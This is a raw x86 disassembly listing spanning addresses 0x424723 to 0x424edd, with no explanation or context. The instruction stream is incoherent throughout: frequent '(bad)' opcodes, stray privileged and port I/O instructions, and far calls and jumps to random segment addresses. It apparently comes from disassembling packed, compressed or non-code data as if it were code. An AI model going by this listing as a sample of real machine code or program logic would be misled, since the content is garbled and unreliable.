  424723:	repz cld 
  424725:	or     dl,ch
  424727:	mov    es,WORD PTR [edi-0x54]
  42472a:	ror    BYTE PTR [esi-0x33dd72e7],1
  424730:	fwait
  424731:	jge    0x4246d0
  424733:	adc    BYTE PTR [edi],0x33
  424736:	into   
  424737:	cmc    
  424738:	lock or eax,0x59b0c960
  42473e:	jp     0x42474a
  424740:	and    al,0x1f
  424742:	jle    0x42476f
  424744:	js     0x424792
  424746:	pop    edi
  424747:	xchg   ebp,eax
  424748:	inc    esp
  424749:	(bad)  
  42474a:	mov    esi,0x451a6306
  42474f:	int3   
  424750:	popf   
  424751:	adc    al,0xfa
  424753:	retf   
  424754:	pop    esi
  424755:	pop    esi
  424756:	shl    BYTE PTR ss:[edx+0x1bc1b945],cl
  42475d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42475e:	xor    eax,0xd66285e2
  424763:	sbb    DWORD PTR [eax+0xb7d8edd],edi
  424769:	xchg   ebx,eax
  42476a:	adc    edi,DWORD PTR ds:0xf99948f2
  424770:	cli    
  424771:	pop    ecx
  424772:	fidivr WORD PTR [ebp+0x14]
  424775:	xchg   DWORD PTR [edi],eax
  424777:	cmp    ecx,esp
  424779:	neg    DWORD PTR [ebx-0x1a1f0cfe]
  42477f:	mov    eax,ds:0x25de650f
  424784:	jne    0x4247ac
  424786:	and    esp,DWORD PTR [esi*2+0x7861ba4f]
  42478d:	hlt    
  42478e:	ins    DWORD PTR es:[edi],dx
  42478f:	add    dl,BYTE PTR [edi-0x1a]
  424792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424793:	adc    ebx,DWORD PTR [esi+0x39]
  424796:	lea    esi,[edi-0x22]
  424799:	push   esi
  42479a:	loop   0x424741
  42479c:	scas   eax,DWORD PTR es:[edi]
  42479d:	and    al,0x99
  42479f:	and    ebp,ecx
  4247a1:	adc    cl,BYTE PTR [edi]
  4247a3:	ficomp DWORD PTR [edi-0x80]
  4247a6:	(bad)  
  4247a7:	pmaxub mm6,QWORD PTR cs:[ebx-0x42]
  4247ac:	arpl   WORD PTR [ecx+edi*1],dx
  4247af:	push   eax
  4247b0:	sub    BYTE PTR [edi],bl
  4247b2:	cmp    ebp,edx
  4247b4:	jp     0x4247d3
  4247b6:	shl    edi,cl
  4247b8:	pop    ebx
  4247b9:	adc    DWORD PTR [edi-0x3f14747d],edi
  4247bf:	lods   al,BYTE PTR ds:[esi]
  4247c0:	push   0xacc839d0
  4247c5:	mov    eax,0x8cb599da
  4247ca:	sbb    DWORD PTR [esi-0x768d198c],eax
  4247d0:	xor    esp,DWORD PTR [ecx]
  4247d2:	loope  0x424820
  4247d4:	mov    ecx,0xfd66e1bb
  4247d9:	mov    WORD PTR [eax+0x20309da3],?
  4247df:	daa    
  4247e0:	push   edi
  4247e1:	cli    
  4247e2:	test   al,0xd7
  4247e4:	outs   dx,DWORD PTR ds:[esi]
  4247e5:	in     eax,0xb
  4247e7:	mov    BYTE PTR [edx],bl
  4247e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247ea:	shl    DWORD PTR [eax+0x44761f22],1
  4247f0:	daa    
  4247f1:	fisub  WORD PTR [edi+ebp*8]
  4247f4:	dec    ebp
  4247f5:	(bad)  
  4247f6:	sar    DWORD PTR [edi],1
  4247f8:	mov    al,BYTE PTR [edi+0x37]
  4247fb:	sbb    al,0x8c
  4247fd:	jmp    0x2fa7aaae
  424802:	ficomp DWORD PTR [esi+0x19]
  424805:	mov    BYTE PTR [ebx+esi*4],al
  424808:	or     eax,edi
  42480a:	call   0x74fe:0x1a165772
  424811:	xchg   edx,eax
  424812:	or     eax,0x794f63e3
  424817:	outs   dx,DWORD PTR ds:[esi]
  424818:	je     0x4247cb
  42481a:	push   ebp
  42481b:	or     BYTE PTR [eax-0x4db388c7],cl
  424821:	adc    eax,0x5afd8fce
  424826:	es add edi,ebp
  424829:	xor    bl,bl
  42482b:	mov    ch,BYTE PTR [eax-0xc]
  42482e:	(bad)  
  42482f:	xchg   ebp,eax
  424830:	ins    DWORD PTR es:[edi],dx
  424831:	cwde   
  424832:	inc    ebp
  424833:	mov    ch,0x79
  424835:	and    DWORD PTR [ebp-0x19],ecx
  424838:	in     al,dx
  424839:	test   eax,0x1d84fc1d
  42483e:	call   0xa54a9474
  424843:	cdq    
  424844:	or     DWORD PTR [ecx+0x6a],ebx
  424847:	add    bh,cl
  424849:	call   0x537d:0xe4861330
  424850:	js     0x4247eb
  424852:	pop    ds
  424853:	dec    esp
  424854:	jle    0x42482e
  424856:	jp     0x42487f
  424858:	mov    dh,0x79
  42485a:	outs   dx,BYTE PTR ds:[esi]
  42485b:	mov    ch,0x2c
  42485d:	mov    dl,0xcf
  42485f:	mov    edi,0x5ad9d8e6
  424864:	xchg   BYTE PTR [ecx-0x56],bh
  424867:	inc    edi
  424868:	lds    esp,FWORD PTR [edx+0x4c]
  42486b:	push   esi
  42486c:	adc    ch,BYTE PTR [eax+0x255dd4ae]
  424872:	fmul   DWORD PTR [edi-0x2ed01359]
  424878:	fwait
  424879:	push   cs
  42487a:	(bad)  
  42487c:	pop    ecx
  42487d:	lods   eax,DWORD PTR ds:[esi]
  42487e:	addr16 js 0x42481a
  424881:	xchg   ebx,eax
  424882:	cmp    eax,DWORD PTR [edx+0x1a]
  424885:	push   esi
  424886:	mov    DWORD PTR [ecx],edi
  424888:	mov    bh,0x99
  42488a:	mov    ah,0x53
  42488c:	sbb    esp,edi
  42488e:	scas   al,BYTE PTR es:[edi]
  42488f:	mov    ch,0xcb
  424891:	cmp    ebp,DWORD PTR [edx+0x1a]
  424894:	je     0x4248d9
  424896:	popa   
  424897:	push   edi
  424898:	dec    ecx
  42489a:	cmp    dl,BYTE PTR [eax]
  42489c:	lahf   
  42489d:	sbb    al,0x35
  42489f:	push   esp
  4248a0:	es int3 
  4248a2:	pushf  
  4248a3:	inc    esi
  4248a4:	not    BYTE PTR [ebx+0x26]
  4248a7:	fistp  DWORD PTR [eax]
  4248a9:	dec    eax
  4248aa:	push   edi
  4248ab:	repnz test DWORD PTR fs:[edx+0x19],esp
  4248b0:	test   al,0x2a
  4248b2:	fcmove st,st(6)
  4248b4:	inc    eax
  4248b5:	and    BYTE PTR [esi+0x6f612dad],0xe1
  4248bc:	xchg   ah,bl
  4248be:	call   0xbf95:0xf72b1dd
  4248c5:	mov    ah,0x2
  4248c7:	inc    eax
  4248c8:	out    dx,eax
  4248c9:	adc    esp,ecx
  4248cb:	xchg   esp,eax
  4248cc:	mov    esp,0xbae24c3d
  4248d1:	test   DWORD PTR [esi+0x73bcc960],0xfd6c088c
  4248db:	loopne 0x42492e
  4248dd:	xchg   ecx,eax
  4248de:	rcr    DWORD PTR [eax+eiz*1-0x4c],1
  4248e2:	mov    ah,0x33
  4248e4:	mov    eax,ds:0xf27917bc
  4248e9:	inc    edx
  4248ea:	outs   dx,DWORD PTR ds:[esi]
  4248eb:	std    
  4248ec:	cmp    DWORD PTR [ebx+0x5be46db],esp
  4248f2:	mov    esp,0x4be55727
  4248f7:	pushf  
  4248f8:	pusha  
  4248f9:	rcl    BYTE PTR fs:0xf1e11000,1
  424900:	daa    
  424901:	mov    DWORD PTR [ecx-0x3a],ecx
  424904:	scas   eax,DWORD PTR es:[edi]
  424905:	retf   0x66e0
  424908:	pushf  
  424909:	cld    
  42490a:	xor    eax,0xb1e86476
  42490f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424910:	xchg   ecx,eax
  424911:	or     eax,0x103c9ce6
  424916:	ss push cs
  424918:	push   eax
  424919:	or     DWORD PTR [edi-0x9],0xc48f95a6
  424920:	push   ebx
  424921:	fmulp  st(4),st
  424923:	imul   ecx,DWORD PTR [ebx],0x4592437f
  424929:	xor    al,0x97
  42492b:	scas   eax,DWORD PTR es:[edi]
  42492c:	sti    
  42492d:	mov    DWORD PTR [eax],eax
  42492f:	add    BYTE PTR [eax],al
  424931:	add    BYTE PTR [ebx],dl
  424933:	lea    ebp,[ecx]
  424935:	imul   edi,DWORD PTR [edi+0x23fd53ef],0x6b
  42493c:	fcmovnb st,st(6)
  42493e:	ja     0x424904
  424940:	and    eax,0x1c239f3
  424945:	add    ah,dh
  424947:	add    al,0x0
  424949:	add    al,dh
  42494b:	gs jge 0x4248f3
  42494e:	loop   0x424962
  424950:	mov    eax,ds:0xb0e03fb4
  424955:	fwait
  424956:	arpl   WORD PTR [edi],sp
  424958:	arpl   WORD PTR [ebx+0x30],di
  42495b:	inc    edx
  42495c:	shr    esi,0x9a
  42495f:	imul   ecx,DWORD PTR [eax-0x7ae0c2fc],0x3e
  424966:	cmp    bl,BYTE PTR [edi-0x44]
  424969:	xor    ecx,ebx
  42496b:	and    bl,ah
  42496d:	in     eax,dx
  42496e:	mov    eax,0x215855e2
  424973:	sub    BYTE PTR [ebx],0x12
  424976:	sub    BYTE PTR [ebx-0x368889df],dh
  42497c:	add    BYTE PTR [ebx+eax*8-0x45],al
  424980:	fbstp  TBYTE PTR [edi-0x7bc32382]
  424986:	adc    ebp,DWORD PTR cs:[esi+0x45]
  42498a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42498b:	cli    
  42498c:	pusha  
  42498d:	fisttp QWORD PTR [edi]
  42498f:	or     bh,bl
  424991:	lods   al,BYTE PTR ds:[esi]
  424992:	xlat   BYTE PTR ds:[ebx]
  424993:	add    bl,BYTE PTR [ecx]
  424995:	inc    edi
  424996:	mov    bl,0x6d
  424998:	sub    eax,DWORD PTR [esi-0x60bb5b18]
  42499e:	imul   esp,DWORD PTR [edx-0x9e185b2],0x51
  4249a5:	not    DWORD PTR [esi+0x231cd7c5]
  4249ab:	fidivr DWORD PTR [ecx+ebp*4]
  4249ae:	and    esi,DWORD PTR [esi+0x1]
  4249b1:	pop    esi
  4249b2:	push   es
  4249b3:	test   eax,0x28208e2e
  4249b8:	test   ebx,ebp
  4249ba:	bound  eax,QWORD PTR gs:[eax]
  4249bd:	rcr    dh,cl
  4249bf:	sub    BYTE PTR [edi+eax*4-0x63ecdd1a],ch
  4249c6:	mov    ebp,0xaa48346b
  4249cb:	mov    eax,fs:0x1b718397
  4249d1:	cmp    dl,BYTE PTR [esi]
  4249d3:	sub    BYTE PTR [esi+0x2],bl
  4249d6:	les    eax,FWORD PTR [ebx+0x428e80b]
  4249dc:	jno    0x424a4c
  4249de:	or     DWORD PTR [edx+0x29],esp
  4249e1:	and    BYTE PTR [ebx],ch
  4249e3:	push   ebp
  4249e4:	daa    
  4249e5:	int3   
  4249e6:	lock xchg esp,eax
  4249e8:	push   0xffffffb5
  4249ea:	sbb    edx,DWORD PTR [ecx]
  4249ec:	dec    edx
  4249ed:	sahf   
  4249ee:	retf   0xddbf
  4249f1:	pop    edi
  4249f2:	mov    ebp,0x84a6bd1f
  4249f7:	mov    DWORD PTR [esi+0x6d],eax
  4249fa:	call   DWORD PTR [edx+0x68]
  4249fd:	xor    BYTE PTR [esp+ecx*1-0x6acf89e9],ch
  424a04:	xchg   BYTE PTR fs:[ecx+0x6454603c],dh
  424a0b:	push   0x56
  424a0d:	jl     0x4249e4
  424a0f:	push   ecx
  424a10:	and    al,0xb4
  424a12:	pop    ebx
  424a13:	fmul   DWORD PTR [edi+eiz*8+0x1cd93ab3]
  424a1a:	mov    ebx,0x588048aa
  424a1f:	mov    ebx,0x97c0ecd0
  424a24:	add    eax,0x72ed1d68
  424a29:	packsswb mm6,QWORD PTR [ebp-0x65]
  424a2d:	call   0x48a2f028
  424a32:	aas    
  424a33:	imul   ebp,DWORD PTR [eax],0xffffffaf
  424a36:	dec    eax
  424a37:	inc    eax
  424a38:	mov    DWORD PTR [edx],ebp
  424a3a:	(bad)  
  424a3b:	(bad)  
  424a3c:	cld    
  424a3d:	lea    ebx,[edi-0x32]
  424a40:	jb     0x4249f8
  424a42:	and    DWORD PTR [edx+ebx*8-0x6d],ebp
  424a46:	fs xchg ecx,eax
  424a48:	and    al,0xd8
  424a4a:	and    eax,esp
  424a4c:	mov    DWORD PTR [edi-0x76],edx
  424a4f:	(bad)  
  424a50:	aad    0xd9
  424a52:	and    DWORD PTR [ecx],0x40a3a05e
  424a58:	xor    bh,BYTE PTR [esi-0x2af99739]
  424a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a5f:	scas   al,BYTE PTR es:[edi]
  424a60:	cmp    ecx,DWORD PTR [eax-0x5]
  424a63:	xchg   ebx,eax
  424a64:	aas    
  424a65:	xchg   esi,eax
  424a66:	lahf   
  424a67:	and    cl,BYTE PTR [esp+edi*4+0x813bfed]
  424a6e:	test   eax,0x8094d191
  424a73:	adc    BYTE PTR [eax+ebp*2],0xb7
  424a77:	mov    ds:0xf6285eba,al
  424a7c:	xor    ebx,eax
  424a7e:	je     0x424af2
  424a80:	gs jg  0x424a55
  424a83:	mov    eax,ds:0xc706e3c7
  424a88:	xchg   edx,eax
  424a89:	cmp    al,0x46
  424a8b:	cmp    ebp,DWORD PTR [ebx-0x6b3a1070]
  424a91:	mov    DWORD PTR ds:0x9c1ffdb7,esp
  424a97:	(bad)  
  424a98:	mov    dh,0xbc
  424a9a:	jb     0x424ad6
  424a9c:	pop    edi
  424a9d:	or     edi,0xffffffcf
  424aa0:	leave  
  424aa1:	(bad)  
  424aa2:	shr    esp,1
  424aa4:	inc    edi
  424aa5:	fcomp  QWORD PTR [ecx-0x4ac84a5]
  424aab:	xor    eax,0x7a830fab
  424ab0:	ins    BYTE PTR es:[edi],dx
  424ab1:	inc    edx
  424ab2:	fild   WORD PTR [edi-0x50]
  424ab5:	test   al,0xce
  424ab7:	adc    al,0x12
  424ab9:	pop    ss
  424aba:	sahf   
  424abb:	out    dx,eax
  424abc:	dec    esp
  424abd:	and    eax,0x381d2fa0
  424ac2:	std    
  424ac3:	xchg   ecx,eax
  424ac4:	cmp    bl,cl
  424ac6:	inc    eax
  424ac7:	rcl    ah,cl
  424ac9:	pop    ebp
  424aca:	mov    al,bh
  424acc:	or     ebx,DWORD PTR [edi]
  424ace:	sbb    ch,bl
  424ad0:	ss pusha 
  424ad2:	xlat   BYTE PTR ds:[ebx]
  424ad3:	scas   eax,DWORD PTR es:[edi]
  424ad4:	push   ecx
  424ad5:	jns    0x424af6
  424ad7:	sub    eax,0x47a8e06f
  424adc:	push   esi
  424add:	xor    ch,BYTE PTR [esi]
  424adf:	dec    ebp
  424ae0:	and    al,0x69
  424ae2:	jmp    0xd00:0xfc67a195
  424ae9:	push   eax
  424aea:	nop
  424aeb:	jo     0x424b64
  424aed:	add    esi,ebx
  424aef:	xchg   esi,eax
  424af0:	ror    bh,cl
  424af2:	jge    0x424b03
  424af4:	call   DWORD PTR [edi+0x3f]
  424af7:	shr    DWORD PTR [ebx+ebp*8],0x8
  424afb:	push   ss
  424afc:	popf   
  424afd:	xchg   BYTE PTR [esi+0x50],bl
  424b00:	and    al,0x53
  424b02:	push   ecx
  424b03:	pop    es
  424b04:	stos   BYTE PTR es:[edi],al
  424b05:	fadd   DWORD PTR [ebx]
  424b07:	js     0x424b2a
  424b09:	xchg   edx,eax
  424b0a:	(bad)  
  424b0b:	jne    0x424af4
  424b0d:	or     ah,BYTE PTR [ecx-0x1f]
  424b10:	adc    DWORD PTR [ecx],ebx
  424b12:	lahf   
  424b13:	add    esp,DWORD PTR [edi-0x34d55b7a]
  424b19:	nop
  424b1a:	jg     0x424b29
  424b1c:	bound  eax,QWORD PTR [eax]
  424b1e:	mov    ch,0x11
  424b20:	add    BYTE PTR [edi+edi*4],cl
  424b23:	inc    edi
  424b24:	aam    0x5f
  424b26:	(bad)  
  424b27:	mov    dl,0x16
  424b29:	and    ebx,esp
  424b2b:	stos   BYTE PTR es:[edi],al
  424b2c:	pop    esi
  424b2d:	sub    eax,0xd9c1dc60
  424b32:	outs   dx,BYTE PTR es:[esi]
  424b34:	call   0x29b8ab83
  424b39:	int3   
  424b3a:	jmp    0xac9d4567
  424b3f:	jnp    0x424b30
  424b41:	add    BYTE PTR [edx],al
  424b43:	ins    BYTE PTR es:[edi],dx
  424b44:	ficomp DWORD PTR [ebx]
  424b46:	aaa    
  424b47:	iret   
  424b48:	and    DWORD PTR [ebp+0x6d],ecx
  424b4b:	xor    ch,al
  424b4d:	int3   
  424b4e:	sar    DWORD PTR [ebp+edx*4+0x10],1
  424b52:	xchg   dh,dl
  424b54:	fsubrp st(0),st
  424b56:	pop    ds
  424b57:	jl     0x424bac
  424b59:	jns    0x424b03
  424b5b:	sub    eax,0x7bd6874d
  424b60:	test   eax,0x20ca1ac5
  424b65:	imul   ebx,DWORD PTR [edx+0x7a],0x5e
  424b69:	xchg   ecx,eax
  424b6a:	xor    ecx,ecx
  424b6c:	adc    ch,BYTE PTR [ecx+0x614bdaeb]
  424b72:	mov    esi,0x4732bc96
  424b77:	(bad)  
  424b78:	mov    al,0xdd
  424b7a:	in     eax,dx
  424b7b:	es jp  0x424bf4
  424b7e:	nop
  424b7f:	dec    esi
  424b80:	scas   eax,DWORD PTR es:[edi]
  424b81:	inc    ebx
  424b82:	shl    bh,0xae
  424b85:	fsubr  QWORD PTR ds:0xf66bba8d
  424b8b:	js     0x424bc3
  424b8d:	hlt    
  424b8e:	test   DWORD PTR [ebx+ecx*1],esp
  424b91:	(bad)  [eax]
  424b93:	imul   eax,DWORD PTR [esi],0x5db08b4d
  424b99:	repnz dec esp
  424b9b:	jae    0x424b58
  424b9d:	mov    gs,ecx
  424b9f:	push   0xffffffcb
  424ba1:	scas   eax,DWORD PTR es:[edi]
  424ba2:	aas    
  424ba3:	push   eax
  424ba4:	mov    dh,0x3
  424ba6:	xchg   esp,eax
  424ba7:	nop
  424ba8:	push   eax
  424ba9:	add    BYTE PTR [eax+0x45346e40],dh
  424baf:	pop    esi
  424bb0:	and    DWORD PTR [ebx-0x14],eax
  424bb3:	mov    ecx,DWORD PTR [eax+esi*4]
  424bb6:	stos   DWORD PTR es:[edi],eax
  424bb7:	loop   0x424bcd
  424bb9:	xor    BYTE PTR [esi],ah
  424bbb:	add    bl,BYTE PTR [ebp-0x53]
  424bbe:	dec    edx
  424bbf:	adc    DWORD PTR [ecx],esi
  424bc1:	aas    
  424bc2:	sub    al,0xf9
  424bc4:	lods   eax,DWORD PTR ds:[esi]
  424bc5:	test   eax,0x87a5c1ec
  424bca:	fdivr  QWORD PTR [ecx+0x4be1ecfb]
  424bd0:	(bad)  
  424bd1:	arpl   WORD PTR [edx+eax*4-0x17],bp
  424bd5:	repnz aam 0xce
  424bd8:	dec    ecx
  424bd9:	push   ebx
  424bda:	lahf   
  424bdb:	icebp  
  424bdc:	adc    bl,BYTE PTR [ebp-0x55]
  424bdf:	sti    
  424be0:	jmp    0x23ae:0x8ad3e76b
  424be7:	test   BYTE PTR [ebx-0x7b95a7a0],dl
  424bed:	sub    eax,0x7c80a89b
  424bf2:	aaa    
  424bf3:	add    ah,BYTE PTR [ebx]
  424bf5:	sbb    esp,edi
  424bf7:	or     al,0x5e
  424bf9:	arpl   WORD PTR [ebp-0x56035069],bx
  424bff:	loope  0x424bbe
  424c01:	jecxz  0x424c02
  424c03:	aas    
  424c04:	ret    
  424c05:	fadd   DWORD PTR [ecx+ecx*8+0x69]
  424c09:	sbb    eax,0x302d160e
  424c0e:	inc    ebx
  424c0f:	sti    
  424c10:	iret   
  424c11:	icebp  
  424c12:	ins    DWORD PTR es:[edi],dx
  424c13:	sub    dh,dl
  424c15:	inc    ebp
  424c16:	sbb    ebp,DWORD PTR [edx+0x2a]
  424c19:	out    0x68,al
  424c1b:	fdivr  DWORD PTR [eax+ebx*1-0x11]
  424c1f:	xchg   ecx,eax
  424c20:	pushf  
  424c21:	adc    ebp,esi
  424c23:	or     ebp,DWORD PTR [edi+0x32b72318]
  424c29:	fnsave [ebp-0x3e]
  424c2c:	lock pop edx
  424c2e:	retf   0x5458
  424c31:	mov    WORD PTR [edx],gs
  424c33:	call   0xf912091d
  424c38:	rcr    DWORD PTR [esi],1
  424c3a:	jp     0x424c40
  424c3c:	adc    ch,BYTE PTR [ebp-0x71858f58]
  424c42:	test   BYTE PTR ss:[edi-0x1d],bl
  424c46:	adc    ch,dh
  424c48:	dec    esi
  424c49:	ja     0x424c88
  424c4b:	fs cdq 
  424c4d:	cmp    BYTE PTR ds:0xfd940918,ch
  424c53:	mov    cl,0x13
  424c55:	dec    esp
  424c57:	sbb    edi,eax
  424c59:	pop    ss
  424c5a:	js     0x424beb
  424c5c:	jbe    0x424c6c
  424c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c5f:	cmp    DWORD PTR [ecx-0x6a7f52b5],edx
  424c65:	push   ebp
  424c66:	mov    fs,WORD PTR [ecx+0x7e39cbf7]
  424c6c:	js     0x424cc4
  424c6e:	push   ds
  424c6f:	sti    
  424c70:	sub    BYTE PTR [edi],bl
  424c72:	sbb    al,0x7b
  424c74:	xor    eax,0x78165226
  424c79:	mov    WORD PTR [esi+0x45b75197],ds
  424c7f:	pop    ecx
  424c80:	sbb    ah,BYTE PTR [esi]
  424c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c83:	outs   dx,BYTE PTR ds:[esi]
  424c84:	les    si,DWORD PTR [ecx+0x6fccebd8]
  424c8b:	xor    al,0xf7
  424c8d:	inc    ebx
  424c8e:	mov    edi,0x7a926eeb
  424c93:	pushf  
  424c94:	imul   edx,DWORD PTR [esi+0x3097c8a1],0x4b
  424c9b:	arpl   WORD PTR [eax-0x44],sp
  424c9e:	mov    dl,0x8a
  424ca0:	scas   al,BYTE PTR es:[edi]
  424ca1:	pop    ss
  424ca2:	and    ch,BYTE PTR [ebx-0x75]
  424ca5:	push   0x6
  424ca7:	mov    ah,0xa5
  424ca9:	aaa    
  424caa:	std    
  424cab:	jmp    0xd75276db
  424cb0:	shr    BYTE PTR [eax+0x2e],1
  424cb3:	ja     0x424ca6
  424cb5:	push   es
  424cb6:	clc    
  424cb7:	push   ebp
  424cb8:	mov    al,BYTE PTR [edi+0x4dd56337]
  424cbe:	push   ds
  424cbf:	bound  esp,QWORD PTR [edx-0x5d]
  424cc2:	jmp    0x424c91
  424cc4:	push   eax
  424cc5:	lahf   
  424cc6:	out    dx,eax
  424cc7:	imul   edx,DWORD PTR [edi+0xb],0x67
  424ccb:	cmp    BYTE PTR [edi],al
  424ccd:	ret    
  424cce:	ret    0x3c23
  424cd1:	jmp    0x9b2f:0xecbce0ec
  424cd8:	mov    bh,0x5c
  424cda:	arpl   WORD PTR [ecx+0x30e3af88],si
  424ce0:	fdivrp st(6),st
  424ce2:	push   ds
  424ce3:	and    ecx,edi
  424ce5:	mov    ch,0xd8
  424ce7:	push   cs
  424ce8:	imul   ecx,DWORD PTR [ecx-0x3a],0xffffffc0
  424cec:	mov    esi,0xf8208505
  424cf1:	jnp    0x424c8a
  424cf3:	add    al,0x31
  424cf5:	stos   BYTE PTR es:[edi],al
  424cf6:	retf   0x409d
  424cf9:	out    0xfe,eax
  424cfb:	adc    ebp,DWORD PTR [edx-0x2446fe17]
  424d01:	sbb    eax,0x1688ead4
  424d06:	inc    ecx
  424d07:	pop    ecx
  424d08:	(bad)  [eax-0x3b]
  424d0b:	xor    eax,0x10827238
  424d10:	(bad)  
  424d12:	adc    ch,ch
  424d14:	lock cmp al,0xdc
  424d17:	lahf   
  424d18:	push   esi
  424d19:	les    ebp,FWORD PTR [edi-0x5c]
  424d1c:	call   0xa544:0xd3c65c3c
  424d23:	jl     0x424d96
  424d25:	add    DWORD PTR [edi-0x45],ecx
  424d28:	loopne 0x424d22
  424d2a:	and    BYTE PTR [ebp+0x14f89506],dl
  424d30:	adc    dl,bh
  424d32:	add    DWORD PTR ds:0x826e944,ecx
  424d38:	nop
  424d39:	mov    ah,0x9d
  424d3b:	push   0x3002cc8d
  424d40:	mov    ecx,0x1bdec64a
  424d45:	jge    0x424d6b
  424d47:	pushw  es
  424d49:	mov    eax,ecx
  424d4b:	xchg   ebp,eax
  424d4c:	mov    ah,0x12
  424d4e:	mov    ebx,0xf8aabd73
  424d53:	pushf  
  424d54:	setbe  BYTE PTR [edx]
  424d57:	inc    ecx
  424d58:	out    dx,eax
  424d59:	iret   
  424d5a:	stc    
  424d5b:	jnp    0x424dd6
  424d5d:	into   
  424d5e:	push   edx
  424d5f:	std    
  424d60:	imul   eax,DWORD PTR [ebx],0x9d46aef5
  424d66:	push   ecx
  424d67:	xor    DWORD PTR [eax],esp
  424d69:	cmp    al,0x9c
  424d6b:	sahf   
  424d6c:	mov    ds:0xd63611c0,eax
  424d71:	sbb    dl,BYTE PTR [edi+0x47d70da9]
  424d77:	add    BYTE PTR [ebp+0x48],0x7d
  424d7b:	call   0xab3e:0xb3683cfc
  424d82:	cmp    al,0x94
  424d84:	cdq    
  424d85:	mov    ebx,0x8b052a81
  424d8a:	aam    0xec
  424d8c:	sahf   
  424d8d:	push   esi
  424d8e:	mov    gs,WORD PTR [ebp+0x271aeb7e]
  424d94:	ss ds cs (bad) 
  424d98:	int    0xa6
  424d9a:	(bad)  
  424d9b:	repz jp 0x424d21
  424d9e:	jne    0x424d28
  424da0:	rcl    DWORD PTR [edx-0x4c],0x11
  424da4:	mov    WORD PTR [ebx+eiz*8+0x55a30c11],es
  424dab:	jns    0x424d75
  424dad:	fwait
  424dae:	test   al,0xf0
  424db0:	jp     0x424db2
  424db2:	or     eax,0xce6c0089
  424db7:	sub    ch,BYTE PTR [edi-0x3e2ae4cb]
  424dbd:	loop   0x424daf
  424dbf:	mov    dl,BYTE PTR [ebp-0x30ce7b50]
  424dc5:	sbb    DWORD PTR [edx-0x49],ebx
  424dc8:	daa    
  424dc9:	xor    DWORD PTR [ecx-0x4f],edi
  424dcc:	es inc edi
  424dce:	test   eax,0xbd2fd125
  424dd3:	xor    al,0x53
  424dd5:	add    al,0x7a
  424dd7:	in     al,0xab
  424dd9:	inc    ecx
  424dda:	inc    ecx
  424ddb:	(bad)  
  424ddc:	mov    bh,BYTE PTR [edx-0x74]
  424ddf:	push   ebx
  424de0:	mov    cl,0xb7
  424de2:	pop    edx
  424de3:	test   al,0x92
  424de5:	push   ds
  424de6:	mov    dh,0x6
  424de8:	inc    esp
  424de9:	push   ss
  424dea:	call   0xe9fa51b8
  424def:	mov    dl,0x87
  424df1:	hlt    
  424df2:	(bad)  [edx]
  424df4:	jno    0x424dd0
  424df6:	lods   al,BYTE PTR ds:[esi]
  424df7:	inc    ebp
  424df8:	nop
  424df9:	rol    DWORD PTR [edi],cl
  424dfb:	and    al,0x56
  424dfd:	sahf   
  424dfe:	and    al,0x89
  424e00:	xchg   esi,eax
  424e01:	xor    cl,dh
  424e03:	imul   ebx,DWORD PTR [edi],0x3e4869f
  424e09:	sbb    DWORD PTR [ebx-0x79c88d78],ecx
  424e0f:	xchg   ecx,eax
  424e10:	js     0x424de0
  424e12:	or     DWORD PTR [ebx],edi
  424e14:	out    0xe5,eax
  424e16:	inc    ebp
  424e17:	ret    
  424e18:	inc    ebx
  424e19:	or     DWORD PTR [esi],esp
  424e1b:	in     eax,dx
  424e1c:	retf   0x18ae
  424e1f:	daa    
  424e20:	ins    BYTE PTR es:[edi],dx
  424e21:	xchg   ecx,eax
  424e22:	sub    eax,esi
  424e24:	mov    eax,ds:0x6a49275a
  424e29:	rol    DWORD PTR [ebp-0x33ff08ac],cl
  424e2f:	test   eax,0xebf3a98b
  424e34:	ja     0x424e11
  424e36:	or     BYTE PTR [edi],ch
  424e38:	sub    al,0x69
  424e3a:	push   ss
  424e3b:	and    BYTE PTR [edx+0x47],0x0
  424e42:	add    BYTE PTR [edi+ecx*2+0x7],0xcf
  424e47:	bswap  eax
  424e49:	(bad)  
  424e4a:	test   al,0x2c
  424e4c:	dec    eax
  424e4d:	or     esi,DWORD PTR [esi]
  424e4f:	neg    BYTE PTR [esi+0x7f]
  424e52:	sub    eax,0xf40001c7
  424e57:	add    al,0x0
  424e59:	add    BYTE PTR [eax+0x70b4b898],dh
  424e5f:	int3   
  424e60:	rcl    esi,1
  424e62:	mov    bl,0xc9
  424e64:	scas   al,BYTE PTR es:[edi]
  424e65:	pusha  
  424e66:	push   esp
  424e67:	mov    dh,0x5c
  424e69:	push   eax
  424e6a:	call   0x1c4eeea0
  424e6f:	mov    ebx,0x46919654
  424e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e75:	jmp    0xd2a67f37
  424e7a:	pop    ss
  424e7b:	lods   eax,DWORD PTR ds:[esi]
  424e7c:	loopne 0x424e99
  424e7e:	in     al,0xbd
  424e80:	cld    
  424e81:	sub    eax,0xede83a9f
  424e86:	jmp    0x91e21b95
  424e8b:	fstp   QWORD PTR [eax-0x6d]
  424e8e:	mov    ecx,0xdeb7f0d5
  424e93:	jmp    0x7ec455d5
  424e98:	in     al,0xdc
  424e9a:	stos   DWORD PTR es:[edi],eax
  424e9b:	sbb    BYTE PTR [ebx],0x68
  424e9e:	mov    ds:0x1dfbbc1a,al
  424ea3:	push   edi
  424ea4:	and    DWORD PTR [ebp+0x403b49a],0x9ac4650f
  424eae:	jl     0x424e33
  424eb0:	shl    dl,cl
  424eb2:	and    BYTE PTR [edi-0x4ad39f23],cl
  424eb8:	mov    dl,0xf1
  424eba:	add    al,0xee
  424ebc:	inc    esi
  424ebd:	mov    ds:0xf7243b00,eax
  424ec2:	adc    eax,0x3e62542e
  424ec7:	jo     0x424eee
  424ec9:	leave  
  424eca:	push   0x7cee74d3
  424ecf:	mov    ch,0x4f
  424ed1:	cld    
  424ed2:	xor    al,0xbd
  424ed4:	(bad)  
  424ed5:	pop    ss
  424ed6:	jnp    0x424e6c
  424ed8:	or     ah,BYTE PTR [eax-0x14]
  424edb:	fld    QWORD PTR [edi]
  424edd:	pushw  es
